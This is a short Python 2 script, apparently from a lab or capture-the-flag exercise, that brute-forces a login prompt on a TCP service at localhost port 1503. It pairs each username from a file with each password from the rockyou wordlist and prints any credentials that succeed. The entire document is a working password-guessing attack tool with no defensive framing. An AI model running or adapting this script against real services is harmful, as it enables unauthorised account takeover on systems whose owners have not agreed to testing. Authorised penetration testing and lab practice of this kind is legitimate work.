#!/usr/bin/python
# colours http://www.siafoo.net/snippet/88
import socket

usernameList = open('users.txt','r').read().splitlines()
passwordList = open('/usr/share/wordlists/rockyou.txt','r').read().splitlines()
        
        
def StartBrute(username):
    try:
        for password in passwordList:
            tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcpSocket.connect(('127.0.0.1',1503))
            udata = tcpSocket.recv(1024)
            print "[+] Successfully connected to host"
            
            if udata.endswith("Enter login: "):
                tcpSocket.send(username + "\n")
                    
            pdata=tcpSocket.recv(1024)
            if pdata.endswith("Enter password: "):
                print "[+] Attempting Password"
                tcpSocket.send(password+ "\n")
            
            result=tcpSocket.recv(1024)
            
            if "Error!" in result:
                tcpSocket.close()
                print "\033[1;31m[-] Failed %s/%s \033[1;m" % (username,password)
            else:
                print "\n\n\033[1;42m[+] Successful Login!\033[1;m"
                print "\033[1;32m[+]      Username: %s\033[1;m" % username
                print "\033[1;32m[+]      Password: %s\033[1;m\n\n" % password
                break
    except:
        raise 


for username in usernameList:
    StartBrute(username)  
 
print "Testing Complete!"

